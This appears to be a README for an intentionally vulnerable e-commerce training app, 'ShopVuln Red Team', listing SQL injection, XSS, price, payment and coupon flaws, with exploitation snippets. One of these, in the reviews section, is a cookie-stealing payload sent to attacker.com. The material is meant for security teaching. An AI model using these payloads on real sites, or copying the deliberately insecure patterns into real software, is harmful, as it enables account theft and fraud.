# ShopVuln Red Team - Vulnerable JavaScript Files

⚠️ **WARNING: INTENTIONALLY VULNERABLE CODE FOR EDUCATIONAL PURPOSES ONLY** ⚠️

These JavaScript files contain deliberate security vulnerabilities for security training and penetration testing practice. **DO NOT USE IN PRODUCTION**.

## Files Overview

### 1. **api.js** - API Configuration
**Purpose**: Base API wrapper for backend communication

**Vulnerabilities**:
- No request validation or signing
- No CSRF protection
- No rate limiting on client side
- Credentials sent in plain text
- No authentication token validation
- No request/response encryption

---

### 2. **utils.js** - Utility Functions
**Purpose**: Helper functions used across the application

**Vulnerabilities**:
- ❌ **NO INPUT SANITIZATION** - Intentional for XSS
- ❌ **NO OUTPUT ENCODING** - Direct innerHTML usage
- Dangerous HTML rendering without sanitization
- Client-side price calculations (manipulation possible)
- No data validation
- localStorage used without encryption
- Weak random number generation
- `eval()` usage with user input
- No CSRF token generation

**Key Vulnerable Functions**:
- `renderHTML()` - Uses innerHTML without sanitization
- `displayMessage()` - Allows script injection
- `createProductCard()` - No HTML encoding
- `createReviewCard()` - XSS vulnerability
- `executeCallback()` - Executes user input as code

---

### 3. **products.js** - Product Display & Search
**Purpose**: Product listing, search, and filtering

**Vulnerabilities**:
- 🔴 **SQL INJECTION** - Search queries sent without sanitization
- XSS in product display
- No input validation
- Direct query parameter usage in SQL
- URL parameters used without validation
- Client-side price data can be manipulated
- No server-side filtering

**Attack Vectors**:
- Search: `' OR '1'='1` (SQL injection)
- Category filter injection
- Price manipulation via DOM

**Exploitation Examples**:
```javascript
// SQL Injection in search
searchInput.value = "' OR '1'='1 --"

// XSS via URL parameter
?search=<script>alert('XSS')</script>

// Price manipulation
document.querySelector('.btn-add-cart').dataset.price = "0.01"
```

---

### 4. **cart.js** - Shopping Cart Management
**Purpose**: Cart operations (add, update, remove items)

**Vulnerabilities**:
- 💰 **PRICE MANIPULATION** - Client-side pricing
- No server-side price validation
- localStorage tampering possible
- Quantity manipulation (negative values allowed)
- Direct price modification in API requests
- No integrity checks on cart data

**Attack Vectors**:
- Modify prices in localStorage
- Set negative quantities
- Direct API calls with custom prices
- Export, modify, and import cart data

**Exploitation Examples**:
```javascript
// Manipulate price in localStorage
let cart = JSON.parse(localStorage.getItem('shopping_cart'));
cart.items[0].price = "0.01";
localStorage.setItem('shopping_cart', JSON.stringify(cart));

// Direct price modification
window.cartManager.modifyItemPrice('product123', 0.01);

// Import manipulated cart
window.cartManager.importCart('{"items":[{"price":"0.01","quantity":100}]}');
```

---

### 5. **checkout.js** - Checkout Process
**Purpose**: Payment processing and order completion

**Vulnerabilities**:
- 🚨 **PAYMENT BYPASS** - Client-side payment validation
- Total amount manipulation
- No server-side payment verification
- Client controls payment status
- Order confirmation without actual payment
- Predictable order IDs
- Session hijacking possible

**Attack Vectors**:
- Modify total in hidden input field
- Call `bypassPayment()` function
- Override total amount
- Client declares payment as successful

**Exploitation Examples**:
```javascript
// Override order total
window.checkoutManager.overrideTotal(0.01);

// Complete bypass - $0 order
window.checkoutManager.bypassPayment();

// Manipulate hidden total field
document.getElementById('total-amount').value = "0.01";

// Request fraudulent refund
window.checkoutManager.requestRefund('order123', 9999.99);
```

---

### 6. **reviews.js** - Product Reviews
**Purpose**: Review submission and display

**Vulnerabilities**:
- 🔴 **XSS (Cross-Site Scripting)** - Main vulnerability
- No HTML sanitization
- Direct innerHTML injection
- Script execution via review content
- Event handler injection
- Image URL validation missing

**Attack Vectors**:
- Review content with script tags
- Event handler in author name
- Malicious image URLs
- Callback function injection

**Exploitation Examples**:
```javascript
// XSS in review content
reviewContent = "<script>alert('XSS')</script>"

// XSS via image onerror
reviewContent = "<img src=x onerror='alert(document.cookie)'>"

// Event handler injection
author = "User<img src=x onerror='alert(1)'>"

// Steal cookies via review
content = "<img src='http://attacker.com/?c='+document.cookie>"
```

---

### 7. **coupons.js** - Coupon Management
**Purpose**: Coupon validation and discount application

**Vulnerabilities**:
- 💸 **COUPON STACKING** - Multiple coupons allowed
- No validation of coupon limits
- Client-side discount calculation
- No expiration checking
- Percentage coupons can exceed 100%
- Reusable single-use coupons
- No per-user coupon limits
- Coupon brute-forcing possible (no rate limit)

**Attack Vectors**:
- Apply multiple coupons
- Duplicate same coupon
- Create custom coupons client-side
- Modify coupon values after application
- Stack percentages over 100%

**Exploitation Examples**:
```javascript
// Apply all available coupons
window.couponManager.applyAllCoupons();

// Duplicate coupon 10 times
window.couponManager.duplicateCoupon('SAVE20', 10);

// Create custom 100% off coupon
window.couponManager.createCustomCoupon('FREE', 'percentage', 100);

// Modify coupon value
window.couponManager.modifyCouponValue(0, 100);

// Brute force coupons
await window.couponManager.bruteforceCoupon('SAVE', 4);
```

---

## Common Vulnerability Patterns

### 1. No Input Sanitization
All user inputs are accepted without validation or sanitization:
```javascript
// VULNERABLE PATTERN
element.innerHTML = userInput;  // XSS
```

### 2. Client-Side Trust
Application trusts client-controlled data:
```javascript
// VULNERABLE PATTERN
const price = element.dataset.price;  // Can be modified
api.post('/cart/add', { price: price });
```

### 3. localStorage Manipulation
Sensitive data stored without encryption:
```javascript
// VULNERABLE PATTERN
localStorage.setItem('cart', JSON.stringify(cart));  // Can be modified
```

### 4. No Server Validation
Client performs calculations server should verify:
```javascript
// VULNERABLE PATTERN
const total = calculateClientSideTotal();  // Can be manipulated
api.post('/checkout', { total: total });
```

---

## API Endpoints (Backend Expected)

All files make calls to `/api/red/shopvuln/` endpoints:

- `GET /products` - List products
- `GET /products?search={query}` - Search products (SQL injection)
- `GET /products/{id}` - Product details
- `POST /cart/add` - Add to cart (price manipulation)
- `PUT /cart/update/{id}` - Update cart item
- `DELETE /cart/remove/{id}` - Remove from cart
- `POST /cart/sync` - Sync cart with server
- `POST /orders/create` - Create order (payment bypass)
- `GET /reviews/product/{id}` - Get reviews
- `POST /reviews/submit` - Submit review (XSS)
- `POST /coupons/validate` - Validate coupon (no rate limit)
- `POST /coupons/available` - List available coupons

---

## Educational Value

### Learning Objectives

1. **SQL Injection**: Understand how unsanitized search queries enable database attacks
2. **XSS**: Learn how innerHTML and unsanitized output create script injection vulnerabilities
3. **Price Manipulation**: See why client-side calculations can't be trusted
4. **Payment Bypass**: Understand importance of server-side payment verification
5. **Business Logic Flaws**: Learn about coupon stacking and validation bypass
6. **Client-Side Trust**: Recognize dangers of trusting client data

### Testing Exercises

1. **SQL Injection**: Bypass search filters, extract data, modify queries
2. **XSS**: Inject scripts via reviews, steal cookies, deface pages
3. **Price Manipulation**: Change prices to $0.01, get free products
4. **Payment Bypass**: Complete orders without payment
5. **Coupon Stacking**: Apply unlimited discounts, negative totals
6. **Data Tampering**: Modify localStorage, intercept API calls

---

## Security Best Practices (What NOT to Do)

This code violates these critical security principles:

❌ Trust client-side data  
❌ Use innerHTML with user input  
❌ Perform security checks client-side only  
❌ Store sensitive data in localStorage  
❌ Skip input validation  
❌ Allow client to control prices  
❌ Implement payment logic client-side  
❌ Permit unlimited coupon stacking  
❌ Use predictable IDs  
❌ Skip rate limiting  

---

## Usage in AegisForge

These files are part of the **ShopVuln Red Team** training module:

1. Students explore the vulnerable application
2. Identify vulnerabilities through code review
3. Exploit vulnerabilities using browser tools
4. Compare with Blue Team (secure) version
5. Learn defensive coding practices

---

## Browser Console Commands

Quick access to vulnerable functions:

```javascript
// Product manipulation
window.productManager.loadProducts()

// Cart manipulation  
window.cartManager.modifyItemPrice('123', 0.01)
window.cartManager.exportCart()

// Checkout bypass
window.checkoutManager.bypassPayment()
window.checkoutManager.overrideTotal(0.01)

// Review XSS
// Submit form with: <img src=x onerror=alert(1)>

// Coupon exploitation
window.couponManager.applyAllCoupons()
window.couponManager.createCustomCoupon('FREE', 'percentage', 100)
```

---

## File Statistics

- **Total Files**: 7
- **Total Lines**: ~2,128
- **Total Size**: ~80KB
- **Vulnerability Types**: 6 (SQL Injection, XSS, Price Manipulation, Payment Bypass, Coupon Stacking, Client-Side Trust)

---

## Compliance

⚠️ **DISCLAIMER**: This code is intentionally insecure and should only be used in controlled training environments. Using this code in production or on public-facing systems could result in:

- Data breaches
- Financial loss
- Legal liability
- Regulatory violations (PCI-DSS, GDPR, etc.)

**Educational Use Only - You Have Been Warned!** 🎓🔒
